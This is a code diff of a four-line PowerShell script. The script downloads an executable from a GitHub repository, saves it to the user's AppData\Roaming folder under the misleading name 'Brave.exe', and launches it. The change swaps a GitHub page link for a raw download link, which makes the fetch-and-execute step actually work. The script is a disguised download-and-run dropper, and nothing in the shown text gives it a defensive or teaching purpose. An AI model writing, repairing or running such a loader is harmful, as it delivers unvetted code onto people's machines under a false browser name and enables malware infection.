@@ -1,4 +1,4 @@
 $p="$HOME\AppData\Roaming\Brave.exe";
 $e=New-Object System.Net.WebClient;
-$e.DownloadFile("https://github.com/Unknwn000/idk/blob/main/main.exe",$p);
+$e.DownloadFile("https://raw.githubusercontent.com/Unknwn000/idk/main/main.exe",$p);
 Start-Process -FilePath $p
